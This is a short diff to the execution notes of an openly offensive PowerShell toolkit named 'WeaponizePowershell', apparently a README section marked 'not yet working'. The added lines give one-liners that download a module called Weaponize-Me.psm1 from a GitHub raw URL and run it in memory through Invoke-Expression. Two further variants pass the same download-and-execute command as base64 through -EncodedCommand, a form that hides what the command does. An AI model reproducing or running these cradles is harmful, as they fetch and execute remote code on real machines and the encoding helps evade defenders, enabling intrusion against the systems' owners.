@@ -9,9 +9,12 @@
 # -------------------------------------Execution------------------------------------------------
   (not yet working)
   
-  Powershell 3+ one liner execute:    
-    powershell.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
-  Powershell Core one liner execute:  
-    pwsh.exe (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
+Powershell 3+ one liner execute:    
+  powershell.exe -command Invoke-Expression (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
   
-
+Powershell Core one liner execute:  
+  pwsh -command Invoke-Expression (IWR http://raw.githubusercontent.com/WillChaos/WeaponizePowershell/master/Weaponize-Me.psm1).content
+  
+Powershell Encoded execution:
+  powershell.exe -EncodedCommand "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFcAaQBsAGwAQwBoAGEAbwBzAC8AVwBlAGEAcABvAG4AaQB6AGUAUABvAHcAZQByAHMAaABlAGwAbAAvAG0AYQBzAHQAZQByAC8AVwBlAGEAcABvAG4AaQB6AGUALQBNAGUALgBwAHMAbQAxACkALgBjAG8AbgB0AGUAbgB0AA=="
+  pwsh -EncodedCommand "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFcAaQBsAGwAQwBoAGEAbwBzAC8AVwBlAGEAcABvAG4AaQB6AGUAUABvAHcAZQByAHMAaABlAGwAbAAvAG0AYQBzAHQAZQByAC8AVwBlAGEAcABvAG4AaQB6AGUALQBNAGUALgBwAHMAbQAxACkALgBjAG8AbgB0AGUAbgB0AA=="
